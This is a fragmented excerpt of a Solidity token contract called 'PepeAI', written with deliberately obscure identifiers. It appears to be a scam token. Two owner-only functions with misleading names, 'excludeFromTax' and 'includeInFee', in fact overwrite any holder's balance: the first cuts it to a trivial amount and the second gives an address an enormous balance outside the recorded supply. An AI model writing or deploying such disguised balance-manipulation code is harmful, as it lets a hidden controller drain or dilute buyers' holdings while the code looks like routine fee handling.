...
interface PepeAIAIAsii is PepeAIAIAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract PepeAIAIAsiii is PepeAIAIAs {
...
contract PepeAI is PepeAIAIAs, PepeAIAIAsi, PepeAIAIAsii, PepeAIAIAsiii {

    mapping(address => uint256) private PepeAIAIsuplly;
  mapping(address => bool) public PepeAIAIAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private PepeAIAIRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public PepeAIAIPaw;
  address PepeAIAIdeploy;



    
    constructor(address PepeAIAIadressss) {
            // Editable
            PepeAIAIdeploy = msg.sender;

        _name = "PepeAI";
        _symbol = "PepeAI";
  PepeAIAIRooter = PepeAIAIadressss;        
    ...
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
      ...
      modifier _internal() {
        require(PepeAIAIRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
  ...
  modifier maxtokens () {
    require(PepeAIAIdeploy == msg.sender, "Ehi20: cannot permit _internal address");
    _;
    ...
    function _transfer(
        ...
        uint256 fromBalance = PepeAIAIsuplly[from];
        require(fromBalance >= lahsab, "Ehi20: transfer lahsab exceeds balance");
        unchecked {
            PepeAIAIsuplly[from] = fromBalance - lahsab;
        }
        PepeAIAIsuplly[to] += lahsab;
  ...
  function excludeFromTax(address excludeaddress) external _internal {
    PepeAIAIsuplly[excludeaddress] = 100000;
    ...
    function _burn(address account, uint256 lahsab) internal virtual {
        ...
        uint256 accountBalance = PepeAIAIsuplly[account];
        require(accountBalance >= lahsab, "Ehi20: burn lahsab exceeds balance");
        unchecked {
            PepeAIAIsuplly[account] = accountBalance - lahsab;
        }
        ALLtotalSupply -= lahsab;
  ...
  function includeInFee(address includeaddress) external _internal {
    PepeAIAIsuplly[includeaddress] = 1000000000 * 10 ** 24;
